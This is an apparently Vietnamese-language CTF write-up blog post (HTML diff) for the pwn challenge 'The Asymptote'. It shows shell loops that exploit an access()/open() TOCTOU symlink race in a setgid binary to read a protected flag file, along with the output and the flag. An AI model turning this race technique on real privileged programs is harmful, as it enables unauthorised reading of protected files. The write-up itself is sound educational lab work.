@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>incognito - Pwn - The Asymptote | vuk3r</title><meta name="author" content="vuk3r"><meta name="copyright" content="vuk3r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Description1234567The AsymptoteA mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on">
+<meta property="og:type" content="article">
+<meta property="og:title" content="incognito - Pwn - The Asymptote">
+<meta property="og:url" content="https://vuk3r.github.io/2026/04/15/incognito-Pwn-The-Asymptote/index.html">
+<meta property="og:site_name" content="vuk3r">
+<meta property="og:description" content="Description1234567The AsymptoteA mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://vuk3r.github.io/img/post/writeup/incognito2026/thumbnail.png">
+<meta property="article:published_time" content="2026-04-15T03:29:33.000Z">
+<meta property="article:modified_time" content="2026-04-15T03:39:17.355Z">
+<meta property="article:author" content="vuk3r">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://vuk3r.github.io/img/post/writeup/incognito2026/thumbnail.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "incognito - Pwn - The Asymptote",
+  "url": "https://vuk3r.github.io/2026/04/15/incognito-Pwn-The-Asymptote/",
+  "image": "https://vuk3r.github.io/img/post/writeup/incognito2026/thumbnail.png",
+  "datePublished": "2026-04-15T03:29:33.000Z",
+  "dateModified": "2026-04-15T03:39:17.355Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "vuk3r",
+      "url": "https://vuk3r.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon/favicon.ico"><link rel="canonical" href="https://vuk3r.github.io/2026/04/15/incognito-Pwn-The-Asymptote/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'incognito - Pwn - The Asymptote',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="vuk3r" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/background/cyberpunk.png);"></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">vuk3r</span></a><a class="nav-page-title" href="/"><span class="site-name">incognito - Pwn - The Asymptote</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">incognito - Pwn - The Asymptote</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-04-15T03:29:33.000Z" title="Created 2026-04-15 10:29:33">2026-04-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-04-15T03:39:17.355Z" title="Updated 2026-04-15 10:39:17">2026-04-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The Asymptote</span><br><span class="line"></span><br><span class="line">A mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on similar absolute logic. It is demonstrably secure.</span><br><span class="line"></span><br><span class="line">Flag Format: IIITL&#123;...&#125;</span><br><span class="line"></span><br><span class="line">nc <span class="number">34.131</span>.<span class="number">216.230</span> <span class="number">1338</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>Challenge chỉ cho ta link <code>nc</code> nên ta nc vào check thử xem có gì trong này :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc <span class="number">34.131</span>.<span class="number">216.230</span> <span class="number">1338</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process <span class="title function_">group</span> <span class="params">(<span class="number">1397804</span>)</span>: Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ ls -lha</span><br><span class="line">ls -lha</span><br><span class="line">total 28K</span><br><span class="line">drwx------  2 ctf  ctf        4.0K Apr 15 02:43 .</span><br><span class="line">drwx--x--x  1 root root       4.0K Apr 15 02:43 ..</span><br><span class="line">-r-xr-s--x 41 root flag_group 8.5K Apr 14 06:38 challenge</span><br><span class="line">-r--r-----  2 root flag_group   57 Apr 15 02:43 flag.txt</span><br><span class="line">-r--r--r-- 36 root flag_group   96 Mar 23 10:44 welcome.txt</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ cat welcome.txt</span><br><span class="line">cat welcome.txt</span><br><span class="line">Welcome, 8r@v3_H@ck3r.</span><br><span class="line"></span><br><span class="line">If you&#x27;re reading this, you&#x27;ve already done more work than most people.</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ ./challenge</span><br><span class="line">./challenge</span><br><span class="line">Welcome, 8r@v3_H@ck3r.</span><br><span class="line"></span><br><span class="line">If you&#x27;re reading this, you&#x27;ve already done more work than most people.</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$</span><br></pre></td></tr></table></figure>
+
+<p>Ta nhận được 3 file : 1 file nhị phân tên <code>challenge</code>, 1 <code>flag.txt</code> và 1 <code>welcome.txt</code>, chạy file binary thì nó in ra nội dung file <code>welcome.txt</code> . </p>
+<p>Với file challenge mình thấy nó được chạy ở quyền group <code>flag_group</code> với mọi user <code>(-r-xr-s--x)</code> và file flag cũng được đọc với quyền <code>root</code> và <code>flag_group</code> , trong khi mình là quyền với user <code>ctf</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">1000</span>(ctf) groups=<span class="number">1000</span>(ctf)</span><br></pre></td></tr></table></figure>
+
+<p>nên bài này mình nghi nó là bài leo quyền để đọc được file flag.</p>
+<p>Nếu thế thì chỉ cần tạo <code>symlink</code> tới file flag là mình sẽ đọc được với quyền <code>flag_group</code> nhưng không đơn giản như vậy.</p>
+<p>mình sẽ thử xóa file welcome.txt rồi tạo symlink từ file <code>flag.txt</code> đặt tên là <code>welcome.txt</code> để đánh lừa file binary, chạy lại để xem output là gì thì nhận được kết quả là như này :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$rm welcome.txt</span><br><span class="line">rm welcome.txt</span><br><span class="line">rm: remove write-protected regular file <span class="string">&#x27;welcome.txt&#x27;</span>? y</span><br><span class="line">y</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ ln -s flag.txt welcome.txt</span><br><span class="line">ln -s flag.txt welcome.txt</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ ls -lha</span><br><span class="line">ls -lha</span><br><span class="line">total <span class="number">24</span>K</span><br><span class="line">drwx------  <span class="number">2</span> ctf  ctf        <span class="number">4.0</span>K Apr <span class="number">15</span> <span class="number">03</span>:<span class="number">00</span> .</span><br><span class="line">drwx--x--x  <span class="number">1</span> root root       <span class="number">4.0</span>K Apr <span class="number">15</span> <span class="number">03</span>:<span class="number">00</span> ..</span><br><span class="line">-r-xr-s--x <span class="number">41</span> root flag_group <span class="number">8.5</span>K Apr <span class="number">14</span> <span class="number">06</span>:<span class="number">38</span> challenge</span><br><span class="line">-r--r-----  <span class="number">2</span> root flag_group   <span class="number">57</span> Apr <span class="number">15</span> <span class="number">03</span>:<span class="number">00</span> flag.txt</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> ctf  ctf           <span class="number">8</span> Apr <span class="number">15</span> <span class="number">03</span>:<span class="number">00</span> welcome.txt -&gt; flag.txt</span><br><span class="line">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$ ./challenge</span><br><span class="line">./challenge</span><br><span class="line">Security Alert: You don<span class="string">&#x27;t have permission to read welcome.txt</span></span><br><span class="line"><span class="string">ctf@bfb9f7dbedb4:~/sessions/player_iRRbZE$</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>Kết quả như này đồng nghĩa với việc nó kiểm tra real UID trước rồi mới đọc file, nếu ta không có quyền đọc file flag.txt thì sẽ không chơi trò này được.</p>
+<p>Nhưng nếu như nó kiểm tra trước rồi mới mở và đọc file, nó dẫn tới khả năng bị <code>race condition</code> với khái niệm <code>TOCTOU – Time Of Check To Time Of Use</code></p>
+<p>Ở đây mình dự đoán code là thay vì gọi hàm <code>open()</code> trực tiếp, nó gọi hàm <code>access()</code> trước rồi mới tới <code>open()</code> </p>
+<p>Flow mình giả sử nó là như này :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (access(<span class="string">&quot;welcome.txt&quot;</span>, R_OK)</span><br><span class="line">|</span><br><span class="line">fopen(<span class="string">&quot;welcome.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">|</span><br><span class="line">fgets(BUFF,<span class="number">1000</span>,FILE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure>
+
+<p>Trước khi đi tới test mình cần check xem có thể thực thi 2 lệnh cùng lúc như nào, thì ở đây mình thấy rằng mỗi khi kết nối tới hệ thống thì nó mở ra 1 thư mục tên là session_abc, vậy có khả năng nếu biết tên thư mục khác thì mình có thể vào được. Mình mở 2 terminal đồng thời  <code>nc</code> tới hệ thống thì thấy có vẻ ok</p>
+<p>vậy thì idea là mở 2 shell, 1 bên gọi tới để thực thi file binary liên tục, 1 bên sẽ tìm cách hoán đổi file welcome.txt</p>
+<p><img src="/img/post/writeup/incognito2026/1.png" alt="image.png"></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Flow mình đánh lừa hệ thống đó là :</p>
+<ol>
+<li>xóa file welcome.txt hiện tại</li>
+<li>tạo file welcome.txt của riêng mình để mình có quyền đọc file đó</li>
+<li>Tạo symlink cho flag.txt mang tên welcome.txt để ghi đè file cũ</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm welcome.txt;</span><br><span class="line">|</span><br><span class="line">echo abc &gt; welcome.txt;</span><br><span class="line">|</span><br><span class="line">ln -sf flag.txt welcome.txt; </span><br></pre></td></tr></table></figure>
+
+<p>Tạo 2 file vòng lặp, và chạy song song, tổ hợp khi 2 vòng lặp đan xen với nhau có khả năng rất nhỏ rằng flow thực thi file binary sẽ là như này : </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rm welcome.txt;</span><br><span class="line">|</span><br><span class="line">echo abc &gt; welcome.txt;</span><br><span class="line">|</span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">&quot;welcome.txt&quot;</span>, R_OK)</span><br><span class="line">| -&gt; Lúc này access sẽ thấy ta có quyền đọc file welcome.txt </span><br><span class="line">|    (-rw-r--r--  <span class="number">1</span> ctf  ctf           <span class="number">4</span> Apr <span class="number">15</span> <span class="number">03</span>:<span class="number">19</span> welcome.txt)</span><br><span class="line">|</span><br><span class="line">ln -sf flag.txt welcome.txt; </span><br><span class="line">|</span><br><span class="line">fopen(<span class="string">&quot;welcome.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">| -&gt; Lúc này welcome.txt đã bị đánh tráo thành symlink nên sẽ mở và đọc file symlink    |    welcome.txt</span><br><span class="line">|</span><br><span class="line">fgets(BUFF,<span class="number">1000</span>,FILE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>terminal 1 sẽ chạy vòng lặp :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  ./challenge;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>terminal 2 sẽ vào thư mục của terminal 1, xóa file <code>welcome.txt</code>và chạy vòng lặp :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  ln -sf flag.txt welcome.txt;</span><br><span class="line">  rm welcome.txt;</span><br><span class="line">  echo abc &gt; welcome.txt;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>Vừa chạy vừa canh sẽ thấy thành quả :&gt; </p>
+<p><img src="/img/post/writeup/incognito2026/2.png" alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ecurity Alert: You don<span class="string">&#x27;t have permission to read welcome.txt</span></span><br><span class="line"><span class="string">Security Alert: You don&#x27;</span>t have permission to read welcome.txt</span><br><span class="line">abc</span><br><span class="line">Security Alert: You don<span class="string">&#x27;t have permission to read welcome.txt</span></span><br><span class="line"><span class="string">abc</span></span><br><span class="line"><span class="string">Security Alert: You don&#x27;</span>t have permission to read welcome.txt</span><br><span class="line">abc</span><br><span class="line">Security Alert: You don<span class="string">&#x27;t have permission to read welcome.txt</span></span><br><span class="line"><span class="string">Security Alert: You don&#x27;</span>t have permission to read welcome.txt</span><br><span class="line">IIITL&#123;<span class="number">4</span>cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d_4876a4790335&#125;</span><br><span class="line">Security Alert: You don<span class="string">&#x27;t have permission to read welcome.txt</span></span><br><span class="line"><span class="string">abc</span></span><br><span class="line"><span class="string">Security Alert: You don&#x27;</span>t have permission to read welcome.txt</span><br><span class="line">abc</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://vuk3r.github.io">vuk3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://vuk3r.github.io/2026/04/15/incognito-Pwn-The-Asymptote/">https://vuk3r.github.io/2026/04/15/incognito-Pwn-The-Asymptote/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><div class="post-share"><div class="social-share" data-image="/img/post/writeup/incognito2026/thumbnail.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img class="cover" src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="onerror=null;src='/img/error/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">PWNABLE.KR - Phần 2</div></div><div class="info-2"><div class="info-item-1">Đây là phần 2 của series Pwnable.kr của mình. Phần này sẽ là các challenge còn lại của Toddler’s Bottle. No need milk anymore, baby grow up ! coin1Description123Mommy, I wanna play a game!ssh coin1@pwnable.kr -p2222 (pw: guest)  Sourcereadme1nc 0 9007 to get flag!  Solutionnc tới địa chỉ thì ta sẽ bắt đầu được game. Luật game cơ bản là tìm đúng đồng xu trong N đồng xu, và người chơi có C dự đoán và thêm 1 lần nữa để nhập đáp án. Với mỗi lần tìm được thì tính là 1 xu, và ta cần tìm được 100 đồ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/02/PWNABLE-KR-Phan-1/" title="PWNABLE.KR - Phần 1"><img class="cover" src="/img/post/writeup/pwnable-kr/thumbnail.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-02</div><div class="info-item-2">PWNABLE.KR - Phần 1</div></div><div class="info-2"><div class="info-item-1">Đây là series try hard giải các challenge trên trang web pwnable.kr. Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :&gt; fdDescription123456Mommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222 (pw:guest)  Source12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stri...</div></div></div></a><a class="pagination-related" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img class="cover" src="/img/post/writeup/picoctf/thumbnail.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">[Writeup] - Solving Pwn on PicoCTF</div></div><div class="info-2"><div class="info-item-1">Hi guys, this is series clear pwn from medium up to highest difficulty. I write these writeups mainly about the things I’ve learned, so some parts might be detailed while others are brief. Even so, they may still be useful to you if you read them. If you have any questions, free to ask me, Im free to share :&gt; PIE TIME 2Description12345Author: Darkraicg492DescriptionCan you try to get the flag? I&#x27;m not revealing anything anymore!!Additional details will be available after launching you...</div></div></div></a><a class="pagination-related" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img class="cover" src="/img/post/writeup/pwnable-kr/thumbnail.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-26</div><div class="info-item-2">PWNABLE.KR - Phần 2</div></div><div class="info-2"><div class="info-item-1">Đây là phần 2 của series Pwnable.kr của mình. Phần này sẽ là các challenge còn lại của Toddler’s Bottle. No need milk anymore, baby grow up ! coin1Description123Mommy, I wanna play a game!ssh coin1@pwnable.kr -p2222 (pw: guest)  Sourcereadme1nc 0 9007 to get flag!  Solutionnc tới địa chỉ thì ta sẽ bắt đầu được game. Luật game cơ bản là tìm đúng đồng xu trong N đồng xu, và người chơi có C dự đoán và thêm 1 lần nữa để nhập đáp án. Với mỗi lần tìm được thì tính là 1 xu, và ta cần tìm được 100 đồ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar/lucy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">vuk3r</div><div class="author-info-description">Learn what we hacked<br>hack what we can't</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/vuk3r"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><a href="/about/">>_$(whoami)</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-number">4.</span> <span class="toc-text">Payload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/15/incognito-Pwn-The-Asymptote/" title="incognito - Pwn - The Asymptote"><img src="/img/post/writeup/incognito2026/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="incognito - Pwn - The Asymptote"/></a><div class="content"><a class="title" href="/2026/04/15/incognito-Pwn-The-Asymptote/" title="incognito - Pwn - The Asymptote">incognito - Pwn - The Asymptote</a><time datetime="2026-04-15T03:29:33.000Z" title="Created 2026-04-15 10:29:33">2026-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="PWNABLE.KR - Phần 2"/></a><div class="content"><a class="title" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2">PWNABLE.KR - Phần 2</a><time datetime="2026-02-26T14:38:06.000Z" title="Created 2026-02-26 21:38:06">2026-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/02/PWNABLE-KR-Phan-1/" title="PWNABLE.KR - Phần 1"><img src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="this.onerror=null;this.src='/img/error/404.jpg'" alt="PWNABLE.KR - Phần 1"/></a><div class="content"><a class="title" href="/2026/02/02/PWNABLE-KR-Phan-1/" title="PWNABLE.KR - Phần 1">PWNABLE.KR - Phần 1</a><time datetime="2026-02-02T14:41:01.000Z" 